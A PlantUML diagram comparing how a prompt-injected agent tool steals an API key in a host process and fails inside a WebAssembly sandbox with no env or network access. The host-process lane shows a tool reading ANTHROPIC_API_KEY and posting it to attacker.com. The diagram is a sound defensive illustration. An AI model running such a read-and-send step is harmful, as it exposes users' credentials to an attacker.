@startuml wasm-doors
!theme plain
skinparam backgroundColor #FFFFFF
skinparam defaultFontSize 14
skinparam ActivityBorderThickness 2
skinparam ArrowThickness 2

title What Happens When a Prompt-Injected Tool Tries to Steal Secrets?

|Host Process|
start
:Injected tool calls\n""process.env.ANTHROPIC_API_KEY""; <<#fdcb6e>>
:Returns ""sk-ant-abc123...""\n**Real key exposed**; <<#ff7675>>
:Injected tool calls\n""fetch("https://attacker.com", {body: key})""; <<#fdcb6e>>
:Request succeeds.\n**Key exfiltrated.**; <<#ff7675>>
stop

|WASM Module|
start
:Injected plugin tries\n""process.env.ANTHROPIC_API_KEY""; <<#fdcb6e>>
:API doesn't exist.\n**ReferenceError.**; <<#00b894>>
stop

note right
  Even if the plugin somehow
  obtained a secret, the next
  step also fails:
end note

start
:Injected plugin tries\n""fetch("https://attacker.com")""; <<#fdcb6e>>
:""allowedHosts"" is empty.\n**Request denied.**; <<#00b894>>
stop

note right
  No shell, no env, no network,
  no filesystem — by default.
  The attack surface is **zero**.
end note

@enduml
